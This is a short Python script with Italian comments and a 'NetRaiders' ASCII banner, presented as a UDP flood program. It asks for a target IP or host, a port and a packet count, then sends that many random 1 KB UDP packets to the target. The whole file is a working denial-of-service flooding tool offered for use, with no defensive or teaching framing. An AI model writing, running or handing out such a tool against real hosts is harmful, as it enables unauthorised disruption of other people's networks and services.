import socket, random     #si importano moduli per creazione socket e generazione numeri casuali

stato = "1"

print("\nBenvenuto nel miglior programma di UDP Flood del mondo creato dai NetRaiders ©\n")

print(" /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$")
print("| $$$ | $$| $$_____/|__  $$__/| $$__  $$ /$$__  $$|_  $$_/| $$__  $$| $$_____/| $$__  $$ /$$__  $$")
print("| $$$$| $$| $$         | $$   | $$  \ $$| $$  \ $$  | $$  | $$  \ $$| $$      | $$  \ $$| $$  \__/")
print("| $$ $$ $$| $$$$$      | $$   | $$$$$$$/| $$$$$$$$  | $$  | $$  | $$| $$$$$   | $$$$$$$/|  $$$$$$ ")
print("| $$  $$$$| $$__/      | $$   | $$__  $$| $$__  $$  | $$  | $$  | $$| $$__/   | $$__  $$ \____  $$")
print("| $$\  $$$| $$         | $$   | $$  \ $$| $$  | $$  | $$  | $$  | $$| $$      | $$  \ $$ /$$  \ $$")
print("| $$ \  $$| $$$$$$$$   | $$   | $$  | $$| $$  | $$ /$$$$$$| $$$$$$$/| $$$$$$$$| $$  | $$|  $$$$$$/")
print("|__/  \__/|________/   |__/   |__/  |__/|__/  |__/|______/|_______/ |________/|__/  |__/ \______/ ")

while stato == "1": 

    SRV_ADDR = input("\nInserisci indirizzo IP/Host bersaglio: ").strip()          #inserimento IP/Host bersaglio

    try:
        
        SRV_PORT = int(input("\nInserisci porta bersaglio (Da 0 a 65535): "))    #inserimento porta bersaglio
        num_pacchetti = int(input("\nInserisci numero di pacchetti da 1KB da inviare: "))   #inserimento numero pacchetti da inviare
        
    except ValueError:                                                         #in caso non si inseriscano valori interi
        
        stato = (input("\nInserire un valore intero! Premi 1 se vuoi riprovare, o qualsiasi altro carattere se vuoi chiudere il programma: ")).strip()

    else:
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                    #socket UDP

            for _ in range(num_pacchetti):

                packet_data = random.randbytes(1024)          #creazione pacchetti random da 1Kb
                s.sendto(packet_data, (SRV_ADDR, SRV_PORT))   #invio pacchetti alla macchina bersaglio
        
            stato = 0         
            print("\n***   Sono stati spediti", num_pacchetti, "pacchetti da 1KB all'indirizzo IP", SRV_ADDR, "sulla porta", SRV_PORT,"  ***\n")
            
        except Exception as e:                        #casistica errore

            print(f"\nErrore durante l'invio: {e}\nSi prega di riavviare il programma\n")
            stato = ( input("Premi 1 se vuoi riprovare: ")).strip()
            
        s.close()  #chiusura socket






